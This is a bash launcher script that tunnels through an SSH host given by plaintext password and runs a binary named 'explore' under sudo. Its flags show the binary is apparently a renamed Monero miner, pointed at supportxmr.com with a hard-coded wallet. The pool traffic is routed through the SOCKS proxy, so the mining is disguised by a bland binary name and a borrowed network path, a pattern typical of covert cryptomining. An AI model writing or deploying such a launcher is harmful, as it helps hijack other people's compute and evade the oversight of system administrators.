#!/usr/bin/env bash
set -Eeuo pipefail

usage() {
  cat >&2 <<'EOF'
Usage:
  [WORKER=worker] ./run-explore-via-ssh-socks.sh SSH_USER SSH_HOST SSH_PASSWORD

POOL_URL defaults to pool.supportxmr.com:443. WORKER defaults to "x".
Optional: SOCKS_PORT (default 1080), EXPLORE_BIN (default ./explore).
Requires ssh, sshpass, and a Linux x86-64 host for the supplied explore binary.
EOF
  exit 2
}

[[ $# -eq 3 ]] || usage
ssh_user=$1
ssh_host=$2
ssh_password=$3

POOL_URL=${POOL_URL:-pool.supportxmr.com:443}
WALLET=46My7nd2dnNhKecQuzWMFw91wHWsC3HzJeXhShrQq6SBEYYYQt1gm1fjMvW6oPNGcFbYYQKYuR5XkKTJiXdJMPa32ZJVhZN
worker=${WORKER:-x}
socks_port=${SOCKS_PORT:-1080}
explore_bin=${EXPLORE_BIN:-./explore}

command -v ssh >/dev/null || { echo "ssh is required" >&2; exit 1; }
command -v sshpass >/dev/null || { echo "sshpass is required (install it with your Linux package manager)" >&2; exit 1; }
[[ -x "$explore_bin" ]] || { echo "Not executable or not found: $explore_bin" >&2; exit 1; }
[[ "$socks_port" =~ ^[0-9]+$ ]] && (( socks_port > 0 && socks_port < 65536 )) || {
  echo "SOCKS_PORT must be between 1 and 65535" >&2; exit 2;
}

if (exec 3<>"/dev/tcp/127.0.0.1/$socks_port") 2>/dev/null; then
  echo "Local port $socks_port is already accepting connections; choose another SOCKS_PORT" >&2
  exit 1
fi

tunnel_pid=
cleanup() {
  if [[ -n "${tunnel_pid:-}" ]]; then
    kill "$tunnel_pid" 2>/dev/null || true
    wait "$tunnel_pid" 2>/dev/null || true
  fi
}
trap cleanup EXIT INT TERM

# sshpass reads the password from a dedicated file descriptor, not its argv.
sshpass -d 3 ssh -N -D "127.0.0.1:$socks_port" \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o StrictHostKeyChecking=accept-new \
  "$ssh_user@$ssh_host" 3<<<"$ssh_password" &
tunnel_pid=$!
unset ssh_password

ready=0
for _ in {1..50}; do
  if ! kill -0 "$tunnel_pid" 2>/dev/null; then
    wait "$tunnel_pid" || true
    echo "SSH tunnel exited before it became ready" >&2
    exit 1
  fi
  if (exec 3<>"/dev/tcp/127.0.0.1/$socks_port") 2>/dev/null; then
    ready=1
    break
  fi
  sleep 0.2
done
(( ready )) || { echo "Timed out waiting for the SOCKS tunnel" >&2; exit 1; }

echo "Running $explore_bin through SSH SOCKS5 at 127.0.0.1:$socks_port"
sudo "$explore_bin" -o "$POOL_URL" --tls --randomx-1gb-pages -u "$WALLET" -p "$worker" \
  --proxy "127.0.0.1:$socks_port"
